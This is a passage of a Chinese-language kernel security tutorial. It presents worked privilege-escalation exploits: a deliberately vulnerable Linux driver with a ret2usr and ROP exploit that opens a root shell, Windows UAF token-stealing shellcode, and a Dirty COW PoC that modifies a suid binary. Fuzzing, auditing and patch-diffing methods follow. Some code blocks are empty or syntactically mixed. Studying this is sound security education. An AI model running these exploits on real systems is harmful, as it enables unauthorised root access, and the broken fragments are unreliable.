3. 使用`addr2line`或GDB定位崩溃代码
4. 分析根因

#### 7.3.2 漏洞复现技巧

**1. 缩小触发条件**：
- 从复杂的PoC逐步简化，找到最小触发条件
- 使用二分法定位关键操作

**2. 内存污染辅助分析**：
- 在分配的内存中填充特定模式（如0x41414141、0xdeadbeef）
- 崩溃时查看内存中的标记，追踪数据流向

**3. 日志输出**：
- 在驱动/内核代码关键位置添加日志输出
- 使用`printk`（Linux）或`DbgPrint`（Windows）
- 注意日志级别，避免信息过多

#### 7.3.3 利用开发调试

**1. 利用编写的一般流程**：
1. 先在关闭保护的环境中调试（无KASLR、无SMEP、无NX）
2. 逐步启用保护机制，逐一绕过
3. 最后在完全保护的环境中测试

**2. 地址泄露调试**：

### 8.1 案例1：Linux内核驱动栈溢出提权

#### 8.1.1 漏洞场景

假设我们有一个存在栈溢出漏洞的字符设备驱动，其write函数存在明显的缓冲区溢出：

```c
// 漏洞驱动代码（vuln_driver.c）
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cdev.h>

#define DEVICE_NAME "vuln_dev"
#define BUF_SIZE 64

static int major;
static struct cdev vuln_cdev;

static ssize_t vuln_write(struct file *file, const char __user *buf,
                          size_t len, loff_t *offset) {
    char kbuf[BUF_SIZE];  // 64字节的栈缓冲区
    
    // 漏洞点：没有检查len的大小，直接复制用户数据到栈上
    if (copy_from_user(kbuf, buf, len)) {
        return -EFAULT;
    }
    
    return len;
}

static long vuln_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    char kbuf[BUF_SIZE];
    
    switch (cmd) {
        case 0x1337:
            // 同样的溢出漏洞
            copy_from_user(kbuf, (char __user *)arg, 256);
            break;
        default:
            return -EINVAL;
    }
    return 0;
}

static struct file_operations vuln_fops = {
    .owner = THIS_MODULE,
    .write = vuln_write,
    .unlocked_ioctl = vuln_ioctl,
};

static int __init vuln_init(void) {
    dev_t dev = MKDEV(major, 0);
    int ret = alloc_chrdev_region(&dev, 0, 1, DEVICE_NAME);
    major = MAJOR(dev);
    
    cdev_init(&vuln_cdev, &vuln_fops);
    vuln_cdev.owner = THIS_MODULE;
    cdev_add(&vuln_cdev, dev, 1);
    
    printk(KERN_INFO "[vuln_driver] loaded, major=%d\n", major);
    return 0;
}

static void __exit vuln_exit(void) {
    dev_t dev = MKDEV(major, 0);
    cdev_del(&vuln_cdev);
    unregister_chrdev_region(dev, 1);
    printk(KERN_INFO "[vuln_driver] unloaded\n");
}

module_init(vuln_init);
module_exit(vuln_exit);
MODULE_LICENSE("GPL");
```

#### 8.1.2 漏洞分析

**漏洞类型**：内核栈溢出

**漏洞触发**：
- 通过`write`系统调用写入超过64字节的数据
- 或通过`ioctl`的0x1337命令传入256字节数据

**缓冲区布局（x86_64）**：
```
低地址
+-------------------+
| kbuf[0..63]       |  64字节缓冲区
+-------------------+
| saved rbp         |  8字节
+-------------------+
| return address    |  8字节  ← 溢出目标
+-------------------+
高地址
```

要覆盖返回地址，需要填充64（缓冲区） + 8（saved rbp） = 72字节垃圾数据，然后是返回地址。

#### 8.1.3 环境准备

**内核配置**（便于调试和利用）：
```

CONFIG_RANDOMIZE_BASE=n  # 先关闭KASLR

```

**获取内核符号地址**：
```bash

```

或者从vmlinux文件中提取偏移：

#### 8.1.4 利用编写（无SMEP - ret2usr方式）

```c
// exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

// 这些地址需要根据实际内核修改
#define COMMIT_CREDS_ADDR      0xffffffff81234567
#define PREPARE_KERNEL_CRED_ADDR 0xffffffff81234567

// 用户态shellcode，在内核态执行
typedef int (*commit_creds_t)(void *);
typedef void * (*prepare_kernel_cred_t)(void *);

static commit_creds_t commit_creds = (commit_creds_t)COMMIT_CREDS_ADDR;
static prepare_kernel_cred_t prepare_kernel_cred = (prepare_kernel_cred_t)PREPARE_KERNEL_CRED_ADDR;

// 保存用户态寄存器状态，用于返回
static unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_user_state(void) {
    __asm__ volatile (
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        "mov %%rsp, %3\n"
        : "=m"(user_cs), "=m"(user_ss), "=m"(user_rflags), "=m"(user_sp)
        :
        : "memory"
    );
}

// 内核态shellcode
void __attribute__((naked)) kernel_shellcode(void) {
    __asm__ volatile (
        // 提权：commit_creds(prepare_kernel_cred(0))
        "mov rdi, 0\n"
        "mov rax, %0\n"
        "call rax\n"
        "mov rdi, rax\n"
        "mov rax, %1\n"
        "call rax\n"
        
        // 恢复用户态
        "swapgs\n"
        "mov %2, %%rax\n"
        "pushq %3\n"      // ss
        "pushq %%rax\n"   // rsp
        "pushq %4\n"      // rflags
        "pushq %5\n"      // cs
        "pushq $return_to_user\n" // rip
        "iretq\n"
        "return_to_user:\n"
        "ret\n"
        :
        : "m"(prepare_kernel_cred), "m"(commit_creds),
          "m"(user_sp), "m"(user_ss), "m"(user_rflags),
          "m"(user_cs)
        : "rax", "rdi", "memory"
    );
}

int main(void) {
    int fd;
    char payload[256];
    
    printf("[*] Saving user state...\n");
    save_user_state();
    
    printf("[*] Opening device...\n");
    fd = open("/dev/vuln_dev", O_RDWR);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    
    // 构造payload
    memset(payload, 'A', 72);  // 填充缓冲区到返回地址
    // 第72字节后是返回地址，指向我们的shellcode
    *(unsigned long *)(payload + 72) = (unsigned long)kernel_shellcode;
    
    printf("[*] Triggering overflow...\n");
    write(fd, payload, 72 + 8);
    
    // 提权成功后应该到这里
    printf("[*] Getting root shell...\n");
    if (getuid() == 0) {
        printf("[+] Got root!\n");
        system("/bin/sh");
    } else {
        printf("[-] Exploit failed, uid=%d\n", getuid());
    }
    
    close(fd);
    return 0;
}
```

#### 8.1.5 利用编写（有SMEP - ROP方式）

当SMEP启用时，不能跳转到用户态shellcode，需要构造ROP链。

```c
// ROP链构造（伪代码示例）
struct rop_chain {
    unsigned long pop_rdi_ret;       // pop rdi; ret
    unsigned long arg0;              // rdi = 0
    unsigned long prepare_kernel_cred; // 调用prepare_kernel_cred(0)
    unsigned long mov_rdi_rax_ret;   // mov rdi, rax; ret
    unsigned long commit_creds;      // 调用commit_creds(new_cred)
    unsigned long swapgs_iretq;      // swapgs; iretq
    // iretq需要的参数
    unsigned long user_rip;          // 返回后的rip
    unsigned long user_cs;           // cs
    unsigned long user_rflags;       // rflags
    unsigned long user_sp;           // rsp
    unsigned long user_ss;           // ss
};

// 构造payload
int offset = 72;  // 缓冲区 + saved rbp
payload[offset + 0]  = pop_rdi_ret;
payload[offset + 8]  = 0;  // rdi = 0
payload[offset + 16] = prepare_kernel_cred;
payload[offset + 24] = mov_rdi_rax_ret;
payload[offset + 32] = commit_creds;
payload[offset + 40] = swapgs_iretq;
payload[offset + 48] = (unsigned long)get_shell;  // 返回用户态后的rip
payload[offset + 56] = user_cs;
payload[offset + 64] = user_rflags;
payload[offset + 72] = user_sp;
payload[offset + 80] = user_ss;
```

**常见问题**：

2. **提权失败**：

3. **返回用户态时崩溃**：

### 8.2 案例2：Windows内核UAF漏洞利用

#### 8.2.1 漏洞场景

假设一个Windows驱动存在UAF漏洞。驱动维护一个对象链表，支持创建、使用、删除对象的操作。

```c
// 漏洞驱动关键代码（伪代码）
typedef struct _MY_OBJECT {
    LIST_ENTRY ListEntry;
    ULONG Id;
    PVOID Context;
    VOID (*Callback)(PVOID);  // 函数指针
    UCHAR Data[64];
} MY_OBJECT, *PMY_OBJECT;

// IOCTL: 创建对象
case IOCTL_CREATE_OBJ:
    obj = (PMY_OBJECT)ExAllocatePoolWithTag(NonPagedPool, sizeof(MY_OBJECT), 'tsoM');
    obj->Id = nextId++;
    obj->Callback = DefaultCallback;
    InsertTailList(&objList, &obj->ListEntry);
    // 返回对象ID给用户态
    break;

// IOCTL: 使用对象
case IOCTL_USE_OBJ:
    obj = FindObjectById(InputBuffer->Id);
    if (obj) {
        obj->Callback(obj->Context);  // 调用回调函数
    }
    break;

// IOCTL: 删除对象
case IOCTL_DELETE_OBJ:
    obj = FindObjectById(InputBuffer->Id);
    if (obj) {
        RemoveEntryList(&obj->ListEntry);
        ExFreePool(obj);  // 释放对象
    }
    break;

// 漏洞点：还有另一个引用指针没有被清除
// 例如，全局缓存中保存了最后使用的对象
PMY_OBJECT g_LastUsedObj;

case IOCTL_USE_OBJ:
    obj = FindObjectById(InputBuffer->Id);
    if (obj) {
        g_LastUsedObj = obj;  // 保存引用
        obj->Callback(obj->Context);
    }
    break;

// 另一个IOCTL可以通过g_LastUsedObj访问对象
case IOCTL_USE_LAST:
    if (g_LastUsedObj) {
        g_LastUsedObj->Callback(g_LastUsedObj->Context);  // UAF！
    }
    break;
```

#### 8.2.2 漏洞分析

**漏洞类型**：释放后重用（UAF）

**漏洞原理**：
1. 创建一个对象
2. 使用该对象（此时g_LastUsedObj指向它）
3. 删除该对象（调用ExFreePool释放）
4. 通过IOCTL_USE_LAST访问g_LastUsedObj（悬空指针）
5. 如果释放的内存被重新分配并填充了攻击者可控的数据，就可以控制回调函数指针

#### 8.2.3 利用步骤

**步骤1：创建并释放对象（制造UAF）**
```c
// 创建对象
DWORD objId = 0;
DeviceIoControl(hDevice, IOCTL_CREATE_OBJ, NULL, 0, &objId, sizeof(objId), &bytesReturned, NULL);

// 使用对象（设置g_LastUsedObj）
USE_OBJ_INPUT input = {objId};
DeviceIoControl(hDevice, IOCTL_USE_OBJ, &input, sizeof(input), NULL, 0, &bytesReturned, NULL);

// 删除对象（释放内存）
DELETE_OBJ_INPUT delInput = {objId};
DeviceIoControl(hDevice, IOCTL_DELETE_OBJ, &delInput, sizeof(delInput), NULL, 0, &bytesReturned, NULL);
```

**步骤2：重新占用释放的内存（堆喷射）**

需要找到一个相同大小（或相近slab大小）、且内容可控的内核对象来重新占用释放的内存。在Windows中，可以使用以下方法：

- **命名管道（Named Pipe）**：创建大量命名管道，其缓冲区在非分页池中分配
- **事件对象/信号量**：创建大量内核同步对象
- **Irp**：通过DeviceIoControl分配Irp相关的内存

假设我们找到一个可以控制内容的对象重新占用了内存，其内容布局与MY_OBJECT重叠。我们需要在Callback函数指针的偏移位置放置我们的ROP链地址或shellcode地址。

**步骤3：触发UAF，劫持控制流**
```c
// 触发IOCTL_USE_LAST，此时g_LastUsedObj指向的内存已被我们伪造
DeviceIoControl(hDevice, IOCTL_USE_LAST, NULL, 0, NULL, 0, &bytesReturned, NULL);
```

当驱动调用`g_LastUsedObj->Callback(g_LastUsedObj->Context)`时，实际上会调用我们伪造的函数指针。

#### 8.2.4 提权实现（Token Stealing）

Windows内核提权的经典方法是Token窃取。在内核态执行以下操作：

```asm
; 伪汇编 - Token窃取shellcode
; 找到当前进程的EPROCESS
mov rax, gs:[188h]      ; KPCR -> KPRCB
mov rax, [rax + 8]      ; CurrentThread
mov rax, [rax + 70h]    ; ApcState.Process (当前进程EPROCESS)
mov rcx, rax            ; 保存当前进程EPROCESS

; 遍历ActiveProcessLinks链表，找到System进程（PID 4）
find_system:
    mov rax, [rax + 2f0h]  ; ActiveProcessLinks.Flink
    sub rax, 2f0h          ; 得到EPROCESS地址
    cmp dword [rax + 2e8h], 4  ; UniqueProcessId == 4 ?
    jne find_system

; 复制System进程的Token
mov rax, [rax + 358h]    ; System进程的Token
and al, 0f0h             ; 清除引用计数低位
mov [rcx + 358h], rax    ; 替换当前进程的Token

; 返回用户态
; ... 恢复上下文 ...
```

**注意**：EPROCESS结构体的偏移随Windows版本不同而变化，需要根据具体版本调整。可以通过WinDbg的`dt nt!_EPROCESS`命令查看。

### 8.3 案例3：CVE-2016-5195 Dirty COW漏洞分析

#### 8.3.1 漏洞概述

**CVE编号**：CVE-2016-5195

**漏洞名称**：Dirty COW（Dirty Copy-On-Write）

**影响范围**：Linux内核2.6.22 - 4.8.3（约9年的所有内核版本）

**漏洞类型**：竞态条件（Race Condition）

**危害**：本地低权限用户可以获取root权限

#### 8.3.2 漏洞原理

Dirty COW漏洞的根源在于Linux内核的写时复制（Copy-On-Write, COW）机制中存在竞态条件。

**写时复制机制**：
- 当一个进程尝试写入一个私有只读映射（MAP_PRIVATE）的页面时
- 内核不直接修改原页面，而是复制一个新页面
- 然后将进程的页表项指向新页面
- 新页面是可写的

**漏洞触发点**：
漏洞出现在`get_user_pages`函数中。当以下三个条件同时满足时，会触发竞态：

1. 一个线程使用`madvise(MADV_DONTNEED)`释放一个私有映射的页面
2. 另一个线程使用`write`系统调用写入`/proc/self/mem`（或使用ptrace）写入同一页面
3. 两个操作在时间上交错

**具体机制**：
- `get_user_pages`在`follow_page_mask`中找到只读页后，会调用`faultin_page`触发COW
- 在COW过程中，如果另一个线程通过`madvise(MADV_DONTNEED)`丢弃了该页
- 当`get_user_pages`重试时，可能绕过写权限检查，直接获取到一个可写的、指向原始只读页面的引用
- 这样攻击者就可以修改原本只读的文件映射页面

**影响**：
- 攻击者可以修改任何只读映射的文件，包括suid二进制文件
- 通过修改suid二进制文件，注入恶意代码，执行时获得root权限

#### 8.3.3 漏洞利用方法

**经典利用思路（修改suid二进制）**：

1. 选择一个suid root的二进制文件（如`/usr/bin/passwd`）
2. 使用`mmap(MAP_PRIVATE)`将其映射到进程地址空间
3. 创建两个线程：
   - 线程1：反复向映射的内存中写入shellcode（通过`/proc/self/mem`）
   - 线程2：反复调用`madvise(MADV_DONTNEED)`丢弃该页面
4. 等待竞态条件触发，成功修改只读映射
5. 执行修改后的suid二进制，获得root shell

**简化的PoC结构**：
```c
// 线程1：写入
void *write_thread(void *arg) {
    int fd = open("/proc/self/mem", O_RDWR);
    while (1) {
        lseek(fd, (off_t)map_addr, SEEK_SET);
        write(fd, shellcode, shellcode_len);
    }
}

// 线程2：丢弃页面
void *madvise_thread(void *arg) {
    while (1) {
        madvise(map_addr, page_size, MADV_DONTNEED);
    }
}

int main() {
    // 1. mmap只读映射一个suid二进制
    int f = open("/usr/bin/passwd", O_RDONLY);
    void *map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, f, 0);
    
    // 2. 启动两个线程
    pthread_create(&t1, NULL, write_thread, NULL);
    pthread_create(&t2, NULL, madvise_thread, NULL);
    
    // 3. 等待，然后验证是否修改成功
    sleep(5);
    
    // 4. 执行修改后的二进制
    system("/usr/bin/passwd");
}
```

#### 8.3.4 漏洞修复

修复方案是在`get_user_pages`相关路径中确保写时复制的原子性，具体修改涉及`follow_page_mask`和`faultin_page`等函数，增加了对FOLL_WRITE标志的正确处理，防止竞态条件下获得对只读页面的可写引用。

修复的核心思路：
- 在`follow_page`中，如果请求写权限但页面是只读的，不再直接返回页面
- 确保每次写访问都经过完整的COW流程
- 增加页表锁的持有时间，防止madvise在中间介入

#### 8.3.5 学习要点

从Dirty COW漏洞中可以学到：
1. **竞态条件的隐蔽性**：该漏洞存在了9年才被发现，说明某些竞态条件非常隐蔽
2. **复杂内核子系统的交互**：漏洞涉及内存管理（COW）、proc文件系统、madvise等多个子系统的交互
3. **利用的巧妙性**：只需要两个线程和两个系统调用就能触发高危漏洞
4. **修复的重要性**：该漏洞影响范围极广，几乎所有Linux系统都受影响

## 第9章 内核漏洞挖掘思路

掌握了漏洞利用技术之后，下一步就是学习如何发现新的内核漏洞。本章介绍内核漏洞挖掘的主要方法和思路。

### 9.1 驱动审计方法

驱动程序是内核漏洞的重灾区，尤其是第三方驱动。审计驱动代码是发现内核漏洞的重要途径。

#### 9.1.1 审计目标的选择

**优先审计的驱动类型**：
- **常见第三方驱动**：杀毒软件、游戏反作弊、安全软件的驱动
- **小众驱动**：代码质量可能较低，审计的人少
- **有源码的驱动**：如开源项目的驱动、Linux内核中的驱动
- **历史上出过漏洞的驱动**：往往还有其他未发现的漏洞

**获取驱动样本**：
- 从软件安装包中提取
- 从`C:\Windows\System32\drivers\`目录收集
- 从GitHub等开源平台获取源码
- 从驱动更新包中提取新版本进行补丁对比

#### 9.1.2 静态审计要点

**IOCTL处理审计**（最重要）：
1. 找到所有IOCTL控制码（CTL_CODE）
2. 检查每个IOCTL的输入输出处理
3. 重点关注：
   - 输入长度是否验证？
   - 用户态指针是否正确使用`ProbeForRead/Write`或`copy_from_user/to_user`？
   - METHOD_NEITHER方式的IOCTL需特别注意
   - 是否有整数溢出？
   - 结构体偏移计算是否正确？

**危险函数检查**：
- 字符串操作：`strcpy`、`strcat`、`sprintf`、`vsprintf`
- 内存操作：`memcpy`、`RtlCopyMemory`（检查长度参数来源）
- 内核内存分配：`ExAllocatePool`、`kmalloc`（检查大小计算）
- 用户态内存访问：直接解引用用户态指针（未使用安全函数）

**竞态条件检查**：
- 多次读取同一用户态数据（Double Fetch）
- 加锁粒度是否足够？
- 引用计数管理是否正确？
- 对象创建/销毁的时序

**UAF检查**：
- 对象释放后是否还有引用？
- 引用计数是否正确增减？
- 回调函数注册后是否在对象销毁前注销？
- 链表操作是否正确移除节点？

**空指针引用检查**：
- 函数返回值是否检查（可能返回NULL）
- 指针使用前是否验证非空
- 异常路径下的指针有效性

#### 9.1.3 动态审计方法

**IOCTL Fuzzing**：
- 拦截驱动的IOCTL分发函数
- 对每个IOCTL控制码发送变异的输入数据
- 监控系统是否崩溃（蓝屏/Oops）

**工具推荐**：
- **IOCTL Fuzzer**：Windows平台的IOCTL模糊测试工具
- **ioctlfuzzer**：Linux平台的IOCTL模糊测试框架
- **Chimera**：自动化驱动审计工具

**调用栈追踪**：
- 使用WPP（Windows Software Trace Preprocessor）追踪
- 使用ftrace（Linux）追踪内核函数调用
- 分析IOCTL的完整调用路径

#### 9.1.4 审计流程建议

```
1. 收集驱动样本
   ↓
2. 初步分析（定位IOCTL分发函数、了解驱动功能）
   ↓
3. 危险函数搜索（grep / 字符串搜索）
   ↓
4. 重点IOCTL详细分析
   ↓
5. 编写PoC验证
   ↓
6. 动态调试确认
   ↓
7. 漏洞评级与报告
```

### 9.2 Fuzzing内核

Fuzzing（模糊测试）是目前最高效的漏洞发现方法之一。内核Fuzzing相比用户态Fuzzing更复杂，但回报也更高。

#### 9.2.1 syzkaller

**简介**：syzkaller是Google开发的操作系统内核模糊测试工具，支持Linux、Windows、macOS、FreeBSD等多个平台。

**特点**：
- 覆盖率引导（coverage-guided）的模糊测试
- 自动生成系统调用序列
- 支持多机分布式Fuzzing
- 内置崩溃分类和去重
- 已发现数千个内核漏洞

**工作原理**：
1. 基于系统调用描述（syzlang）生成随机系统调用序列
2. 在虚拟机中执行这些系统调用
3. 收集覆盖率信息（通过KCMP、KCOV等）
4. 保留能增加覆盖率的输入（变异）
5. 检测内核崩溃（Oops、panic）

**搭建步骤（Linux）**：
```bash
# 1. 下载syzkaller
go get -u github.com/google/syzkaller/...

# 2. 编译带KCOV的内核
# 内核配置：
# CONFIG_KCOV=y
# CONFIG_DEBUG_INFO=y
# CONFIG_KASAN=y  # 可选，内存错误检测
# CONFIG_DEBUG_FS=y

# 3. 创建虚拟机镜像
# 使用create-image.sh或debootstrap

# 4. 配置syzkaller
# 编写.cfg配置文件，指定内核、镜像、虚拟机参数等

# 5. 启动Fuzzing
bin/syz-manager -config my.cfg
```

**关键配置项**：
- `kernel`：内核bzImage路径
- `image`：磁盘镜像路径
- `sshkey`：SSH密钥
- `count`：并行VM数量
- `procs`：每个VM的并行进程数
- `type`：虚拟机类型（qemu、kvm、gce等）

#### 9.2.2 kAFL

**简介**：kAFL（Kernel AFL）是基于AFL（American Fuzzy Lop）的内核模糊测试框架，使用Intel PT（Processor Trace）硬件特性收集覆盖率。

**特点**：
- 基于硬件追踪（Intel PT），性能高
- 支持黑盒Fuzzing（不需要插桩内核）
- 支持Windows和Linux内核
- 特别适合驱动Fuzzing

**工作原理**：
1. 使用Intel PT硬件追踪内核代码执行路径
2. 将PT数据解码为覆盖率信息
3. 基于覆盖率反馈进行Fuzzing
4. 在QEMU/KVM虚拟机中运行目标内核

**适用场景**：
- 驱动Fuzzing（指定驱动入口点进行Fuzz）
- 系统调用Fuzzing
- 文件系统Fuzzing
- 网络协议栈Fuzzing

#### 9.2.3 内核Fuzzing的挑战

1. **速度慢**：内核Fuzzing通常比用户态慢得多，因为涉及虚拟机启动、系统调用开销等
2. **崩溃检测难**：内核崩溃需要特殊机制检测（如串口监控、虚拟机监控）
3. **崩溃不可靠**：某些崩溃可能是偶发的、竞态条件导致的，难以复现
4. **覆盖率收集开销大**：软件插桩会显著降低性能，硬件追踪需要特定CPU支持
5. **状态空间巨大**：内核接口（系统调用、IOCTL）数量庞大，组合爆炸

#### 9.2.4 提高Fuzzing效率的方法

1. **缩小目标范围**：专注于特定驱动或子系统，而不是整个内核
2. **定制输入生成**：根据目标接口的特点定制输入模型，而不是完全随机
3. **使用快照恢复**：从快照快速恢复，而不是每次重启虚拟机
4. **并行化**：使用多机、多核并行Fuzzing
5. **种子语料库优化**：使用高质量的种子（如现有测试用例、PoC）启动Fuzz
6. **Sanitizer辅助**：启用KASAN、UBSAN等检测工具，更容易发现内存问题

### 9.3 补丁对比与漏洞挖掘

补丁对比（Patch Diffing）是一种高效的漏洞挖掘方法：通过对比安全补丁前后的代码差异，找到修复的漏洞点，进而理解漏洞原理甚至发现未完全修复的问题。

#### 9.3.1 补丁对比的价值

- **快速理解漏洞**：从补丁反推漏洞原理，学习漏洞模式
- **挖掘N-day漏洞**：在补丁发布后、大部分用户升级前，快速写出利用代码
- **发现0-day漏洞**：
  - 补丁修复不完整的地方
  - 同一代码模式在其他位置的类似问题
  - 补丁引入的新漏洞

#### 9.3.2 补丁获取

**Windows补丁**：
- 从Microsoft Update Catalog下载更新包
- 提取补丁中的更新文件（.sys驱动等）
- 对比新旧版本的二进制

**Linux内核补丁**：
- 从kernel.org的Git仓库获取提交记录
- 使用`git diff`查看提交差异
- 关注带有`CVE`、`security`、`fix`等关键词的提交

**Android内核补丁**：
- Android Security Bulletin（每月安全公告）
- AOSP的Gerrit代码审查系统
- 各个厂商的内核开源仓库

#### 9.3.3 补丁对比工具

**二进制级别对比**：
- **Bindiff**：Zynamics出品（现属Google），IDA Pro插件，功能强大
- **Diaphora**：开源的Bindiff替代品，支持IDA和Radare2
- **Ghidra Function Graph Diff**：Ghidra自带的对比功能
- **PatchDiff2**：IDA Pro插件

**源码级别对比**：
- `git diff` / `diff`：基础对比工具
- **Vimdiff** / **WinMerge** / **Beyond Compare**：可视化对比
- **Meld**：开源的文件和目录对比工具

#### 9.3.4 补丁分析流程

```
1. 获取补丁前后的两个版本
   ↓
2. 识别修改的函数（Bindiff匹配）
   ↓
3. 重点分析变化最大的函数
   ↓
4. 理解修复逻辑（修复了什么问题？）
   ↓
5. 反推漏洞触发条件
   ↓
6. 验证：编写PoC确认漏洞
   ↓
7. 扩展：搜索同一模式在其他位置的存在
```

#### 9.3.5 从补丁中挖掘新漏洞的技巧

**1. 查找未修复的相似问题**：
- 分析补丁修复的代码模式
- 在整个代码库中搜索相同或相似的模式
- 这些位置很可能存在同样的漏洞

**2. 检查修复是否完整**：
- 补丁是否覆盖了所有触发路径？
- 是否有绕过修复的可能？
- 整数溢出修复后是否还有其他溢出路径？

**3. 关注边缘情况**：
- 补丁修复了主路径，但错误处理路径是否也修复了？
- 多线程场景下是否还有竞态？
- 不同架构（32位/64位）是否都考虑了？

**4. 分析补丁引入的新问题**：
- 修复代码本身是否引入了新的漏洞？
- 锁的使用是否导致死锁？
- 内存分配/释放是否匹配？

### 9.4 漏洞挖掘思路总结

#### 9.4.1 漏洞发现方法对比

| 方法 | 优点 | 缺点 | 适用场景 |
|------|------|------|----------|
| 人工审计 | 深入理解代码，可发现复杂漏洞 | 效率低，依赖经验 | 小范围高质量审计 |
| 模式匹配 | 快速，可自动化 | 只能发现已知模式的漏洞 | 初步筛查 |
| Fuzzing | 自动化程度高，可发现未知漏洞 | 效率低，需要大量计算资源 | 大规模漏洞挖掘 |
| 补丁对比 | 精准，漏洞质量高 | 需要有补丁，偏N-day | 快速跟进安全更新 |

#### 9.4.2 进阶学习建议

1. **多读漏洞分析报告**：
   - Project Zero博客
   - 各大安全公司的安全研究博客
   - CVE详情和Exploit-DB的利用代码

2. **多练手写利用代码**：
   - 从简单的栈溢出开始
   - 逐步挑战UAF、类型混淆等复杂漏洞
   - 尝试绕过各种缓解机制

3. **参与开源项目代码审查**：
   - 阅读Linux内核、驱动的源码
   - 关注安全相关的邮件列表
   - 参与漏洞赏金计划

4. **关注前沿研究**：
   - 顶级安全会议（USENIX Security、CCS、NDSS、S&P）
   - Black Hat、Def Con等会议
   - 各种安全CTF比赛的内核题

#### 9.4.3 注意事项

1. **合法合规**：
   - 只在授权的环境中进行测试
   - 遵守法律法规和道德规范
   - 发现漏洞后按照负责任的披露流程报告

2. **安全第一**：
   - 在隔离的环境中实验（虚拟机、测试机）
   - 重要数据做好备份
   - 不要在生产环境中测试

3. **持续学习**：
   - 内核安全是一个快速发展的领域
   - 新的漏洞类型和缓解机制不断出现
   - 保持学习和研究的热情
